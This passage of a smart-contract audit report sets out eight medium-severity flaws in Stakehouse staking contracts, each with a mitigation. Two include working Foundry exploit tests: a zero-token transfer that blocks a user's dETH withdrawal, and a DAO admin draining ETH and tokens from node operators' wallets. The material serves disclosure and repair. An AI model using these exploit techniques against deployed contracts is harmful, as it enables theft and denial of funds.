 Check that a day has passed since user has interacted with Giant LP Token\n4.  burn tokens\n5.  send tokens\n\nExample of `WithdrawDETH`:<br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L66>\n\n        function withdrawDETH(\n            address[] calldata _savETHVaults,\n            LPToken[][] calldata _lpTokens,\n            uint256[][] calldata _amounts\n        ) external {\n            uint256 numOfVaults = _savETHVaults.length;\n            require(numOfVaults > 0, \"Empty arrays\");\n            require(numOfVaults == _lpTokens.length, \"Inconsistent arrays\");\n            require(numOfVaults == _amounts.length, \"Inconsistent arrays\");\n\n            // Firstly capture current dETH balance and see how much has been deposited after the loop\n            uint256 dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this));\n            for (uint256 i; i < numOfVaults; ++i) {\n                SavETHVault vault = SavETHVault(_savETHVaults[i]);\n\n                // Simultaneously check the status of LP tokens held by the vault and the giant LP balance of the user\n                for (uint256 j; j < _lpTokens[i].length; ++j) {\n                    LPToken token = _lpTokens[i][j];\n                    uint256 amount = _amounts[i][j];\n\n                    // Check the user has enough giant LP to burn and that the pool has enough savETH vault LP\n                    _assertUserHasEnoughGiantLPToClaimVaultLP(token, amount);\n\n                    require(vault.isDETHReadyForWithdrawal(address(token)), \"dETH is not ready for withdrawal\");\n\n                    // Giant LP is burned 1:1 with LPs from sub-networks\n                    require(lpTokenETH.balanceOf(msg.sender) >= amount, \"User does not own enough LP\");\n\n                    // Burn giant LP from user before sending them dETH\n                    lpTokenETH.burn(msg.sender, amount);\n\n                    emit LPBurnedForDETH(address(token), msg.sender, amount);\n                }\n\n                // Ask\n                vault.burnLPTokens(_lpTokens[i], _amounts[i]);\n            }\n\n            // Calculate how much dETH has been received from burning\n            dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this)) - dETHReceivedFromAllSavETHVaults;\n\n            // Send giant LP holder dETH owed\n            getDETH().transfer(msg.sender, dETHReceivedFromAllSavETHVaults);\n        }\n\nThe bug is in `_assertUserHasEnoughGiantLPToClaimVaultLP` in the last require that checks that a day has passed since the user has interacted with Giant LP Token:<br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L93>\n\n        function _assertUserHasEnoughGiantLPToClaimVaultLP(LPToken _token, uint256 _amount) internal view {\n            require(_amount >= MIN_STAKING_AMOUNT, \"Invalid amount\");\n            require(_token.balanceOf(address(this)) >= _amount, \"Pool does not own specified LP\");\n            require(lpTokenETH.lastInteractedTimestamp(msg.sender) + 1 days < block.timestamp, \"Too new\");\n        }\n\nThe condition `lpTokenETH.lastInteractedTimestamp(msg.sender) + 1 days < block.timestamp` can be set to fail by the hacker. The hacker  transfers 0 `lpTokenETH` tokens to  `msg.sender`. This transfer will update the `lastInteractedTimestamp` to now.\n\nThe above can be done once a day or on-demand by front-running the withdraw commands.\n\n`_afterTokenTransfer` in `GiantLP.sol`:<br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantLP.sol#L43>\n\n        function _afterTokenTransfer(address _from, address _to, uint256 _amount) internal override {\n            lastInteractedTimestamp[_from] = block.timestamp;\n            lastInteractedTimestamp[_to] = block.timestamp;\n            if (address(transferHookProcessor) != address(0)) ITransferHookProcessor(transferHookProcessor).afterTokenTransfer(_from, _to, _amount);\n        }\n\n### Foundry POC\n\nThe POC will show how a hacker prevents a user from receiving dETH although they are eligible to receive it.\n\nAdd the following test to `GiantPools.t.sol`:<br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/GiantPools.t.sol#L118>\n\n        function testPreventWithdraw() public {\n            // Set up users and ETH\n            address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether);\n            address feesAndMevUserOne = accountTwo; vm.deal(feesAndMevUserOne, 4 ether);\n            address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);\n\n            // Register BLS key\n            registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);\n\n            // Deposit 24 ETH into giant savETH\n            vm.prank(savETHUser);\n            giantSavETHPool.depositETH{value: 24 ether}(24 ether);\n            assertEq(giantSavETHPool.lpTokenETH().balanceOf(savETHUser), 24 ether);\n            assertEq(address(giantSavETHPool).balance, 24 ether);\n\n            // Deploy 24 ETH from giant LP into savETH pool of LSDN instance\n            bytes[][] memory blsKeysForVaults = new bytes[][](1);\n            blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);\n\n            uint256[][] memory stakeAmountsForVaults = new uint256[][](1);\n            stakeAmountsForVaults[0] = getUint256ArrayFromValues(24 ether);\n\n            giantSavETHPool.batchDepositETHForStaking(\n                getAddressArrayFromValues(address(manager.savETHVault())),\n                getUint256ArrayFromValues(24 ether),\n                blsKeysForVaults,\n                stakeAmountsForVaults\n            );\n            assertEq(address(manager.savETHVault()).balance, 24 ether);\n\n            // Deposit 4 ETH into giant fees and mev\n            vm.startPrank(feesAndMevUserOne);\n            giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);\n            vm.stopPrank();\n\n            assertEq(address(giantFeesAndMevPool).balance, 4 ether);\n            stakeAmountsForVaults[0] = getUint256ArrayFromValues(4 ether);\n            giantFeesAndMevPool.batchDepositETHForStaking(\n                getAddressArrayFromValues(address(manager.stakingFundsVault())),\n                getUint256ArrayFromValues(4 ether),\n                blsKeysForVaults,\n                stakeAmountsForVaults\n            );\n\n            // Ensure we can stake and mint derivatives\n            stakeAndMintDerivativesSingleKey(blsPubKeyOne);\n\n            IERC20 dETHToken = savETHVault.dETHToken();\n\n            vm.startPrank(accountFive);\n            dETHToken.transfer(address(savETHVault.saveETHRegistry()), 24 ether);\n            vm.stopPrank();\n\n            LPToken[] memory tokens = new LPToken[](1);\n            tokens[0] = savETHVault.lpTokenForKnot(blsPubKeyOne);\n\n            LPToken[][] memory allTokens = new LPToken[][](1);\n            allTokens[0] = tokens;\n\n            stakeAmountsForVaults[0] = getUint256ArrayFromValues(24 ether);\n\n            // User will not have any dETH to start\n            assertEq(dETHToken.balanceOf(savETHUser), 0);\n\n            // Warp ahead -> savETHUser eligible to dETH\n            vm.warp(block.timestamp + 2 days);\n\n            // Send 0 tokens to savETHUser so he cannot withdrawDETH\n            address hacker = address(0xdeadbeef);\n            vm.startPrank(hacker);\n            giantSavETHPool.lpTokenETH().transfer(savETHUser, 0);\n            vm.stopPrank();\n            address[] memory addresses = getAddressArrayFromValues(address(manager.savETHVault()));\n\n            vm.startPrank(savETHUser);\n            // Validate withdrawDETH will revert  \n            vm.expectRevert(\"Too new\");\n            giantSavETHPool.withdrawDETH(addresses, allTokens, stakeAmountsForVaults);\n            vm.stopPrank();    \n        }\n\nTo run the POC execute:\n`yarn test -m \"PreventWithdraw\" -v`\n\nExpected output:\n\n    Running 1 test for test/foundry/GiantPools.t.sol:GiantPoolTests\n    [PASS] testPreventWithdraw() (gas: 3132637)\n    Test result: ok. 1 passed; 0 failed; finished in 9.25ms\n\nTo run with full trace, execute: `yarn test -m \"PreventWithdraw\" -vvvv`\n\n### Tools Used\n\nVS Code, Foundry\n\n### Recommended Mitigation Steps\n\nMake sure transfers in the GiantLP are only for funds larger than (0.001 ETH), this will make the exploitation expensive.\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/49#issuecomment-1329524394)**\n\n\n\n***\n\n## [[M-02] Rotating `LPTokens` to banned BLS public key](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/64)\n*Submitted by [HE1M](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/64)*\n\nIt is possible to rotate `LPTokens` to a banned BLS public key. This is not a safe action, because it can result in insolvency of the project (specially if the banned BLS public key was malicious).\n\n### Proof of Concept\n\nWhen a user deposits ETH for staking by calling `depositETHForStaking`, the manager checks whether the provided BLS public key is banned or not.<br>\n`require(liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, \"BLS public key is banned or not a part of LSD network\");`<br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L113>\n\nIf it is not banned the `LPToken` related to that BLS public key will be minted to the caller, so the number of `LPToken` related to that BLS public key will be increased.<br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/liquid-staking/ETHPoolLPFactory.sol#L125>\n\nIf it is banned, it will not be possible to stake to this BLS public key, so the number of `LPToken` will not be increased. But the issue is that it is still possible to increase the `LPToken` of this BLS public key through rotating `LPToken`.\n\nIn other words, a malicious user can call `rotateLPTokens`, so that the `_oldLPToken` will be migrated to `_newLPToken` which is equal to the `LPToken` related to the banned BLS public key.\n\nIn summary, the vulnerability is that during rorating `LPTokens`, it is not checked that the `_newLPToken` is related to a banned BLS public key or not.\n\n### Recommended Mitigation Steps\n\nThe following line should be added to function `rotateLPTokens(...)`:<br>\n`require(liquidStakingNetworkManager.isBLSPublicKeyBanned(blsPublicKeyOfNewKnot ) == false, \"BLS public key is banned or not a part of LSD network\");`<br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L76>\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/64#issuecomment-1329521931)**\n\n\n\n***\n\n## [[M-03] Giant pools cannot receive ETH from vaults](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/74)\n*Submitted by [0xdeadbeef0x](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/74), also found by [datapunk](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/372), [bin2chen](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/293), [hihen](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/183), and [koxuan](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/119)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L137><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126>\n\nBoth giant pools are affected:\n\n1.  GiantSavETHVaultPool\n2.  bringUnusedETHBackIntoGiantPool\n\nThe giant pools have a `bringUnusedETHBackIntoGiantPool` function that calls the vaults to send back any unused ETH.\nCurrently, any call to this function will revert.<br>\nUnused ETH will not be sent to the giant pools and will stay in the vaults.\n\nThis causes an insolvency issue when many users want to withdraw ETH and there is not enough liquidity inside the giant pools.\n\n### Proof of Concept\n\n`bringUnusedETHBackIntoGiantPool` calls the vaults to receive ETH:<br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L137>\n\n        function bringUnusedETHBackIntoGiantPool(\n            address[] calldata _savETHVaults,\n            LPToken[][] calldata _lpTokens,\n            uint256[][] calldata _amounts\n        ) external {\n            uint256 numOfVaults = _savETHVaults.length;\n            require(numOfVaults > 0, \"Empty arrays\");\n            require(numOfVaults == _lpTokens.length, \"Inconsistent arrays\");\n            require(numOfVaults == _amounts.length, \"Inconsistent arrays\");\n            for (uint256 i; i < numOfVaults; ++i) {\n                SavETHVault vault = SavETHVault(_savETHVaults[i]);\n                for (uint256 j; j < _lpTokens[i].length; ++j) {\n                    require(\n                        vault.isDETHReadyForWithdrawal(address(_lpTokens[i][j])) == false,\n                        \"ETH is either staked or derivatives minted\"\n                    );\n                }\n                vault.burnLPTokens(_lpTokens[i], _amounts[i]);\n            }\n        }\n\nthe vaults go through a process of burning the `_lpTokens` and sending the caller giant pool ETH.\n\n`burnLPToken`<br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SavETHVault.sol#L126>\n\n        function burnLPToken(LPToken _lpToken, uint256 _amount) public nonReentrant returns (uint256) {\n            /// .....\n            (bool result,) = msg.sender.call{value: _amount}(\"\");\n            // .....\n        }\n\nGiant pools do not have a `fallback` or `receive` function. ETH cannot be sent to them\n\nAdditionally, there is no accounting of `idleETH`, which should be increased with the received ETH in order to facilitate withdraws\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\n1.  Add a `fallback` or `receive` function to the pools.\n2.  `idleETH` should be increased with the received ETH\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/74#issuecomment-1329518912)**\n\n\n\n***\n\n## [[M-04] GiantPool should not check ETH amount on withdrawal](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/92)\n*Submitted by [aphak5010](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/92), also found by [Trust](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/406), [Jeiwan](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/257), [yixxas](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/170), and [HE1M](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/55)*\n\nThe `GiantPoolBase.withdrawETH` function requires that the amount to withdraw is at least as big as the `MIN_STAKING_AMOUNT` (<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L53>).\n\nThis check does not serve any purpose and can actually cause the user problems when withdrawing his ETH.\n\n### Proof of Concept\n\n1.  Bob deposits ETH into the GiantPool with the `GiantPoolBase.depositETH` function.\\\n    The amount is equal to `MIN_STAKING_AMOUNT + 0.99 * MIN_STAKING_AMOUNT`.\n2.  Bob witdraws `MIN_STAKING_AMOUNT` ETH from the GiantPool.\n3.  Bob has `0.99 * MIN_STAKING_AMOUNT` ETH left in the GiantPool. This is a problem since he cannot withdraw this amount of ETH since it is smaller than `MIN_STAKING_AMOUNT`.\\\n    In order to withdraw his funds, Bob needs to first add funds to the GiantPool such that the deposited amount is big enough for withdrawal.  However this causes extra transaction fees to be paid (loss of funds) and causes a bad user experience.\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nThe `require(_amount >= MIN_STAKING_AMOUNT, \"Invalid amount\");` statement should just be removed. It does not serve any purpose anyway.\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/92#issuecomment-1329518081)**\n\n\n\n***\n\n## [[M-05] Adding non EOA representative](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/93)\n*Submitted by [HE1M](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/93), also found by [joestakey](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/448), [SmartSek](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/444), [Jeiwan](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/261), and [yixxas](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/187)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L308><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L289>\n\nIt is not allowed to add non-EOA representative to the smart wallet.<br>\nBut, this limitation can be bypassed by rotating representatives.\n\n### Proof of Concept\n\nDuring registering a node runner to LSD by creating a new smart wallet, it is checked that the `_eoaRepresentative` is an EOA or not.\n\n    require(!Address.isContract(_eoaRepresentative), \"Only EOA representative permitted\");\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L426>\n\nBut this check is missing during rotating EOA representative in two functions `rotateEOARepresentative` and `rotateEOARepresentativeOfNodeRunner`.\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L289><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L308>\n\nIn other words `_newRepresentative` can be a contract in these two functions without being prevented. So, this can bypass the check during registering a node runner to LSD.\n\n### Recommended Mitigation Steps\n\nThe following line should be added to functions `rotateEOARepresentative` and `rotateEOARepresentativeOfNodeRunner`:\n\n    require(!Address.isContract(_newRepresentative), \"Only EOA representative permitted\");\n\n**[vince0656 (Stakehouse) confirmed duplicate issue #187](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/187#issuecomment-1329469080)**\n\n\n\n***\n\n## [[M-06] Withdrawing wrong LPToken from GiantPool leads to loss of funds](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/98)\n*Submitted by [aphak5010](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/98), also found by [datapunk](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/362), [arcoun](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/302), [wait](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/264), [unforgiven](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/212), and [yixxas](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/171)*\n\nThe `GiantPoolBase.withdrawLPTokens` function (<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L69>) allows to withdraw LP tokens from a GiantPool by burning an equal amount of GiantLP.\n\nThis allows a user to handle the LP tokens directly without the need for a GiantPool as intermediary.\n\nIt is not checked however whether the LP tokens to be withdrawn were transferred to the GiantPool in exchange for staking ETH.\n\nI.e. whether the LP token are of any value.\n\nThere are two issues associated with this behavior.\n\n1.  A malicious user can create and mint his own LP Token and send it to the GiantPool. Users that want to withdraw LP tokens from the GiantPool can then be tricked into withdrawing worthless attacker LP tokens, thereby burning their GiantLP tokens that are mapped 1:1 to ETH. (-> loss of funds)\n\n2.  This can also mess up internal accounting logic. For every LP token that is owned by a GiantPool there should be a corresponding GiantLP token. Using the described behavior this ratio can be broken such that there are LP token owned by the GiantPool for which there is no GiantLP token. This means some LP token cannot be transferred from the GiantPool and there will always be some amount of LP token \"stuck\" in the GiantPool.\n\n### Proof of Concept\n\n1.  The attacker deploys his own LPToken contract and sends a huge amount of LP tokens to the GiantPool to pass the check in `GiantPoolBase._assertUserHasEnoughGiantLPToClaimVaultLP` (<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L95>).\n2.  The attacker tricks Bob into withdrawing the malicious LP tokens from the GiantPool (<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L69>).\n3.  Bob's GiantLP tokens are burnt and he receives worthless LP tokens.\n\nThe same issue exists for the `GiantSavETHVaultPool.withdrawDETH` function.<br>\nBut in this case, the victim must also provide a wrong savETHVault address which makes this issue less likely to be exploited.\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nThe GiantPool should store information about which LP tokens it receives for staking ETH.<br>\nWhen calling the `GiantPoolBase.withdrawLPTokens` function it can then be checked if the LP tokens to be withdrawn were indeed transferred to the GiantPool in exchange for staking ETH.\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/98)**\n\n\n\n***\n\n## [[M-07] OwnableSmartWallet: Multiple approvals can lead to unwanted ownership transfers](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/99)\n*Submitted by [aphak5010](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/99)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L94><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L105-L106>\n\nThe `OwnableSmartWallet` contract employs a mechanism for the owner to approve addresses that can then claim ownership (<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L94>) of the contract.\n\nThe source code has a comment included which states that \"Approval is revoked, in order to avoid unintended transfer allowance if this wallet ever returns to the previous owner\" (<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L105-L106>).\n\nThis means that when ownership is transferred from User A to User B, the approvals that User A has given should be revoked.\n\nThe existing code does not however revoke all approvals that User A has given. It only revokes one approval.\n\nThis can lead to unwanted transfers of ownership.\n\n### Proof of Concept\n\n1.  User A approves User B and User C to claim ownership\n2.  User B claims ownership first\n3.  Only User A's approval for User B is revoked, not however User A's approval for User C\n4.  User B transfers ownerhsip back to User A\n5.  Now User C can claim ownership even though this time User A has not approved User C\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nYou should invalidate all approvals User A has given when another User becomes the owner of the OwnableSmartWallet.\n\nUnfortunately you cannot use a statement like `delete _isTransferApproved[owner()]`.\n\nSo you would need an array that keeps track of approvals as pointed out in this StackExchange question: <https://ethereum.stackexchange.com/questions/15553/how-to-delete-a-mapping>\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/99#issuecomment-1329517472)**\n\n\n\n***\n\n## [[M-08] DAO admin in `LiquidStakingManager.sol` can rug the registered node operator by stealing their fund in the smart wallet via arbitrary execution.](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/106)\n*Submitted by [ladboy233](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/106), also found by [joestakey](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/449), [Trust](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/411), and [chaduke](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/48)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L202><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L210><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L426><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L460><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L63>\n\nDAO admin in LiquidStakingManager.sol can rug the registered node operator by stealing their fund via arbitrary execution.\n\n### Proof of Concept\n\nAfter the Liquid Staking Manager.so is deployed via `LSDNFactory::deployNewLiquidStakingDerivativeNetwork`,\n\n```solidity\n/// @notice Deploys a new LSDN and the liquid staking manger required to manage the network\n/// @param _dao Address of the entity that will govern the liquid staking network\n/// @param _stakehouseTicker Liquid staking derivative network ticker (between 3-5 chars)\nfunction deployNewLiquidStakingDerivativeNetwork(\n\taddress _dao,\n\tuint256 _optionalCommission,\n\tbool _deployOptionalHouseGatekeeper,\n\tstring calldata _stakehouseTicker\n) public returns (address) {\n```\n\nThe DAO address governance address (contract) has very high privilege.\n\nThe DAO address can perform arbitrary execution by calling LiquidStakingManager.sol::executeAsSmartWallet\n\n```solidity\n/// @notice Enable operations proxied through DAO contract to another contract\n/// @param _nodeRunner Address of the node runner that created the wallet\n/// @param _to Address of the target contract\n/// @param _data Encoded data of the function call\n/// @param _value Total value attached to the transaction\nfunction executeAsSmartWallet(\n\taddress _nodeRunner,\n\taddress _to,\n\tbytes calldata _data,\n\tuint256 _value\n) external payable onlyDAO {\n\taddress smartWallet = smartWalletOfNodeRunner[_nodeRunner];\n\trequire(smartWallet != address(0), \"No wallet found\");\n\tIOwnableSmartWallet(smartWallet).execute(\n\t\t_to,\n\t\t_data,\n\t\t_value\n\t);\n}\n```\n\nWhen a register a new node operator with 4 ETH by calling registerBLSPublicKeys:\n\n```solidity\n/// @notice register a node runner to LSD by creating a new smart wallet\n/// @param _blsPublicKeys list of BLS public keys\n/// @param _blsSignatures list of BLS signatures\n/// @param _eoaRepresentative EOA representative of wallet\nfunction registerBLSPublicKeys(\n\tbytes[] calldata _blsPublicKeys,\n\tbytes[] calldata _blsSignatures,\n\taddress _eoaRepresentative\n) external payable nonReentrant {\n```\n\nthe smart wallet created in the smart contract custody the 4 ETH.\n\n```solidity\n// create new wallet owned by liquid staking manager\nsmartWallet = smartWalletFactory.createWallet(address(this));\nemit SmartWalletCreated(smartWallet, msg.sender);\n```\n\n```solidity\n{\n\t// transfer ETH to smart wallet\n\t(bool result,) = smartWallet.call{value: msg.value}(\"\");\n\trequire(result, \"Transfer failed\");\n\temit WalletCredited(smartWallet, msg.value);\n}\n```\n\nbut  Dao admin in LiquidStakingManager.sol can rug the registered node operator by stealing their fund in the smart wallet via arbitrary execution.\n\n**As shown in POC:**\n\nfirst we add this smart contract in LiquidStakingManager.t.sol\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12>\n\n```solidity\nimport { ERC20 } from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\ncontract RugContract {\n\n    function receiveFund() external payable {\n\n    }\n\n    receive() external payable {}\n}\n\ncontract MockToken is ERC20 {\n\n    constructor()ERC20(\"A\", \"B\") {\n        _mint(msg.sender, 10000 ether);\n    }\n\n}\n```\n\n**We add the two POC,**\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L35>\n\nthe first POC shows the admin can steal the ETH from the smart contract via arbrary execution.\n\n```solidity\n    function testDaoRugFund_Pull_ETH_POC() public {\n        \n        address user = vm.addr(21312);\n\n        bytes[] memory publicKeys = new bytes[](1);\n        publicKeys[0] = \"publicKeys\";\n\n        bytes[] memory signature = new bytes[](1);\n        signature[0] = \"signature\";\n\n        RugContract rug = new RugContract();\n\n        // user spends 4 ehter and register the key to become the public operator\n        vm.prank(user);\n        vm.deal(user, 4 ether);\n        manager.registerBLSPublicKeys{value: 4 ether}(\n            publicKeys,\n            signature,\n            user\n        );\n        address wallet = manager.smartWalletOfNodeRunner(user);\n        console.log(\"wallet ETH balance for user after registering\");\n        console.log(wallet.balance);\n\n        // dao admin rug the user by withdraw the ETH via arbitrary execution.\n        vm.prank(admin);\n        bytes memory data = abi.encodeWithSelector(RugContract.receiveFund.selector, \"\");\n        manager.executeAsSmartWallet(\n            user,\n            address(rug),\n            data,\n            4 ether\n        );\n        console.log(\"wallet ETH balance for user after DAO admin rugging\");\n        console.log(wallet.balance);\n\n    }\n```\n\nWe run the test:\n\n```solidity\nforge test -vv --match testDaoRugFund_Pull_ETH_POC\n```\n\nthe result is\n\n```solidity\nRunning 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests\n[PASS] testDaoRugFund_Pull_ETH_POC() (gas: 353826)\nLogs:\n  wallet ETH balance for user after registering\n  4000000000000000000\n  wallet ETH balance for user after DAO admin rugging\n  0\n\nTest result: ok. 1 passed; 0 failed; finished in 13.63ms\n```\n\nthe second POC shows the admin can steal the ERC20 token from the smart contract via arbrary execution.\n\n```solidity\n    function testDaoRugFund_Pull_ERC20_Token_POC() public {\n\n        address user = vm.addr(21312);\n\n        bytes[] memory publicKeys = new bytes[](1);\n        publicKeys[0] = \"publicKeys\";\n\n        bytes[] memory signature = new bytes[](1);\n        signature[0] = \"signature\";\n\n        RugContract rug = new RugContract();\n\n        vm.prank(user);\n        vm.deal(user, 4 ether);\n        manager.registerBLSPublicKeys{value: 4 ether}(\n            publicKeys,\n            signature,\n            user\n        );\n\n        address wallet = manager.smartWalletOfNodeRunner(user);\n        ERC20 token = new MockToken();\n        token.transfer(wallet, 100 ether);\n\n        console.log(\"wallet ERC20 token balance for user after registering\");\n        console.log(token.balanceOf(wallet));\n\n        vm.prank(admin);\n        bytes memory data = abi.encodeWithSelector(IERC20.transfer.selector, address(rug), 100 ether);\n        manager.executeAsSmartWallet(\n            user,\n            address(token),\n            data,\n            0\n        );\n\n        console.log(\"wallet ERC20 token balance for dao rugging\");\n        console.log(token.balanceOf(wallet));\n\n    }\n```\n\nWe run the test:\n\n```solidity\nforge test -vv --match testDaoRugFund_Pull_ERC20_Token_POC\n```\n\nthe running result is\n\n```solidity\nRunning 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests\n[PASS] testDaoRugFund_Pull_ERC20_Token_POC() (gas: 940775)\nLogs:\n  wallet ERC20 token balance for user after registering\n  100000000000000000000\n  wallet ERC20 token balance for dao rugging\n  0\n\nTest result: ok. 1 passed; 0 failed; finished in 16.99ms\n```\n\n### Tools 